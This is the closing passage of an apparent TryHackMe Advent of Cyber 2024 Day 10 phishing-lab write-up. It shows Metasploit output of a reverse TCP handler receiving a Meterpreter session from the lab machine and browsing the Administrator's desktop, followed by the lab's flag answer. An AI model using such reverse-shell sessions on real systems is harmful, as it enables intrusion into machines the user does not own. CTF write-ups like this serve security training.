<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Started</span> <span class="nx">reverse</span> <span class="nx">TCP</span> <span class="nx">handler</span> <span class="nx">on</span> <span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Sending</span> <span class="nf">stage </span><span class="p">(</span><span class="mi">176198</span> <span class="nx">bytes</span><span class="p">)</span> <span class="nx">to</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span>
<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="nx">Meterpreter</span> <span class="nx">session</span> <span class="mi">1</span> <span class="nf">opened </span><span class="p">(</span><span class="nx">CONNECTION_IP</span><span class="p">:</span><span class="mi">8888</span> <span class="o">-&gt;</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">103.92</span><span class="p">:</span><span class="mi">52536</span><span class="p">)</span> <span class="nx">at</span> <span class="mi">2024</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">24</span> <span class="mi">16</span><span class="p">:</span><span class="mi">37</span><span class="p">:</span><span class="mi">47</span> <span class="o">+</span><span class="mi">0300</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">cd</span> <span class="nx">c</span><span class="p">:</span><span class="o">/</span><span class="nx">users</span><span class="o">/</span><span class="nx">Administrator</span><span class="o">/</span><span class="nx">Desktop</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span> <span class="nx">ls</span>
<span class="p">[...]</span>
<span class="nx">meterpreter</span> <span class="o">&gt;</span>
</code></pre></div></div>

<p>Answer the questions below</p>

<p>What is the flag value inside the <code class="language-plaintext highlighter-rouge">flag.txt</code> file that’s located on the Administrator’s desktop?</p>

<p>THM{PHISHING_CHRISTMAS}</p>

<p>If you enjoyed this task, feel free to check out the <a href="https://tryhackme.com/module/phishing">Phishing</a> module.</p>

  </article>
  
    <div class="post-share">
  <div class="post-date">Feel free to share!</div>
  <div class="sharing-icons">
    <a href="https://twitter.com/intent/tweet?text=TryHackMe Advent of Cyber - Day 10&amp;url=/Day10" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
    <a href="https://www.facebook.com/sharer/sharer.php?u=/Day10&amp;title=TryHackMe Advent of Cyber - Day 10" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a>
  </div>
</div>

  
  
    <div class="related">
  <h2>You may also enjoy...</h2>
  
  <ul class="related-posts">
    
  </ul>
</div>

  
  
    <section class="disqus">
  <div id="disqus_thread"></div>
  <script type="text/javascript">
    var disqus_shortname = "tryhackme-advent-of-cyber-2024-mberger-writeup";
    var disqus_identifier = "/Day10";
    (function() {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</section>

  
</div>

      </div>
      <footer class="footer">
  
    <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
  
    <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
  
  <div class="footer-description"><a href="/">THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication by Michael</a></div>
</footer>

    </div>
  </body>
</html>
